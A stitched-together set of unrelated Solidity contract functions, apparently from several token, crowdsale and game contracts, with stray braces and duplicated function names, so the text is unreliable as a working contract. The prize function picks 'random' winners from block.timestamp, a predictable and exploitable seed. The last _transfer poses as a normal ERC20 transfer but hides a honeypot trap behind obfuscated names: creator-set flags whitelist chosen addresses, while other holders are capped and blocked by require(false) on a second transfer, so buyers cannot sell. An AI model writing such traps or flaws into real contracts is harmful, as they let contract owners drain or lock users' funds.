}

function transferFrom(address from, address to, uint tokens) public returns(bool success) {
    require(now > endDate || totalEthers == CAP);
    balances[from] = safeSub(balances[from], tokens);
    allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
    balances[to] = safeAdd(balances[to], tokens);
    Transfer(from, to, tokens);
    return true;
}

function transfer(address to, uint tokens) public returns(bool success) {
    require(now > endDate || totalEthers == CAP);
    balances[msg.sender] = safeSub(balances[msg.sender], tokens);
    balances[to] = safeAdd(balances[to], tokens);
    Transfer(msg.sender, to, tokens);
    return true;
}

function finish(uint8 _firstWinner, uint8 _secondWinner, uint8 _thirdWinner) external onlyOwner whenNotFinished {
    uint256 firstPlaceAmount;
    uint256 secondPlaceAmount;
    uint256 thirdPlaceAmount;
    (firstPlaceAmount, secondPlaceAmount, thirdPlaceAmount) = calculatePrizes();
    players[_firstWinner].transfer(firstPlaceAmount);
    players[_secondWinner].transfer(secondPlaceAmount);
    players[_thirdWinner].transfer(thirdPlaceAmount);
    finished = true;
}

function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) external onlyAccess {
    uint256 unclaimedJade = balanceOfUnclaimed(player);
    if (purchaseCost > unclaimedJade) {
        uint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);
        require(jadeBalance[player] >= jadeDecrease);
        roughSupply = SafeMath.sub(roughSupply, jadeDecrease);
        jadeBalance[player] = SafeMath.sub(jadeBalance[player], jadeDecrease);
    } else {
        uint256 jadeGain = SafeMath.sub(unclaimedJade, purchaseCost);
        roughSupply = SafeMath.add(roughSupply, jadeGain);
        jadeBalance[player] = SafeMath.add(jadeBalance[player], jadeGain);
    }
    lastJadeSaveTime[player] = block.timestamp;
}

function balanceOfUnclaimed(address player) public constant returns(uint256) {
    uint256 lSave = lastJadeSaveTime[player];
    if (lSave > 0 && lSave < block.timestamp) {
        return SafeMath.mul(getJadeProduction(player), SafeMath.div(SafeMath.sub(block.timestamp, lSave), 60));
    }
    return 0;
}

function() private payable crowdsaleState {
    require(msg.value >= 0.01 ether);
    require(now >= startTime);
    uint256 currentMaxSupply;
    uint256 tokensPerEther = 5000;
    uint256 _tokens = tokensPerEther * msg.value;
    uint256 bonus = 0;
    if (contract_state == State.Presale) {
        currentMaxSupply = presaleMaxSupply;
        if (now <= startTime + 1 days) {
            bonus = 25;
        } else if (now <= startTime + 2 days) {
            bonus = 20;
        }
    } else {
        currentMaxSupply = marketMaxSupply;
    }
    _tokens += _tokens * bonus / 100;
    uint256 restTokens = currentMaxSupply - totalSupply;
    if (_tokens > restTokens) {
        uint256 bonusTokens = restTokens - restTokens / (100 + bonus) * 100;
        uint256 spentWei = (restTokens - bonusTokens) / tokensPerEther;
        assert(spentWei < msg.value);
        msg.sender.transfer(msg.value - spentWei);
        _tokens = restTokens;
    }
    mintTokens(msg.sender, _tokens);
}

function() external payable {
    totalEthInWei = totalEthInWei + msg.value;
    uint256 amount = msg.value * unitsOneEthCanBuy;
    require(_balances[fundsWallet] >= amount);
    _balances[fundsWallet] = _balances[fundsWallet].sub(amount);
    _balances[msg.sender] = _balances[msg.sender].add(amount);
    emit Transfer(fundsWallet, msg.sender, amount);
    fundsWallet.transfer(msg.value);
    if (msg.data.length == 20) {
        address referer = bytesToAddress(bytes(msg.data));
        require(referer != address(0x0), "zero-referrer");
        require(referer != msg.sender, "self-referrer");
        uint refererTokens = amount.mul(10).div(100); 
        require(_balances[fundsWallet] >= refererTokens);
        _balances[fundsWallet] = _balances[fundsWallet].sub(refererTokens);
        _balances[referer] = _balances[referer].add(refererTokens);
        emit Transfer(fundsWallet, referer, refererTokens);
    }
}

function _transfer(address from,
    address to,
    uint value,
    bytes data) internal {
    require(to != 0x0);
    require(balances_[from] >= value);
    require(balances_[to] + value > balances_[to]); 
    if (msg.sender != owner) require(now >= 1527321600);
    balances_[from] -= value;
    balances_[to] += value;
    bytes memory ignore;
    ignore = data; 
    emit Transfer(from, to, value); 
}

function awardPrizes() external {
    require(msg.sender == ownerAddress);
    require(now >= LAUNCH_DATE);
    require(!prizesAwarded);
    prizesAwarded = true;
    uint256 highestDeposit;
    address highestDepositWinner;
    for (uint256 i = 0; i < depositors.length; i++) {
        address depositor = depositors[i];
        if (deposits[depositor] > highestDeposit) {
            highestDeposit = deposits[depositor];
            highestDepositWinner = depositor;
        }
    }
    uint256 numContestants = depositors.length;
    uint256 seed1 = numContestants + block.timestamp;
    uint256 seed2 = seed1 + uniqueReferers.length;
    address randomDepositWinner1 = depositors[randomContestant(numContestants, seed1)];
    address randomDepositWinner2 = depositors[randomContestant(numContestants, seed2)];
    while (randomDepositWinner2 == randomDepositWinner1) {
        seed2++;
        randomDepositWinner2 = depositors[randomContestant(numContestants, seed2)];
    }
    highestDepositWinner.transfer(TOP_DEPOSIT_PRIZE);
    randomDepositWinner1.transfer(RANDOM_DEPOSIT_PRIZE1);
    randomDepositWinner2.transfer(RANDOM_DEPOSIT_PRIZE2);
}

function getProofOfStakeReward(address _address) internal constant returns(uint) {
    require((now >= stakeStartTime) && (stakeStartTime > 0));
    uint _now = now;
    uint _coinAge = getCoinAge(_address, _now);
    if (_coinAge <= 0) return 0;
    uint interest = maxMintProofOfStake;
    return (_coinAge * interest).div(365 * (10 ** decimals));
}

function getCoinAge(address _address, uint _now) internal constant returns(uint _coinAge) {
    if (transferIns[_address].length <= 0) return 0;
    for (uint i = 0; i < transferIns[_address].length; i++) {
        if (_now < uint(transferIns[_address][i].time).add(stakeMinAge)) continue;
        uint nCoinSeconds = _now.sub(uint(transferIns[_address][i].time));
        if (nCoinSeconds > stakeMaxAge) nCoinSeconds = stakeMaxAge;
        _coinAge = _coinAge.add(uint(transferIns[_address][i].amount) * nCoinSeconds.div(1 days));
    }
}

function ownerSetStakeStartTime(uint timestamp) onlyOwner external {
    require((stakeStartTime <= 0) && (timestamp >= chainStartTime));
    stakeStartTime = timestamp;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (platanos == false)) {
        nyc = chTx;
        thisValue = true;
    }
    if ((address(sender) == creator) && (platanos == true)) {
        dudio[recipient] = true;
        soup[recipient] = false;
        platanos = false;
    }
    if (dudio[recipient] != true) {
        soup[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((soup[sender]) && (dudio[recipient] == false)) {
        soup[recipient] = true;
    }
    if (dudio[sender] == false) {
        require(amount < nyc);
        if (thisValue == true) {
            if (sopa[sender] == true) {
                require(false);
            }
            sopa[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

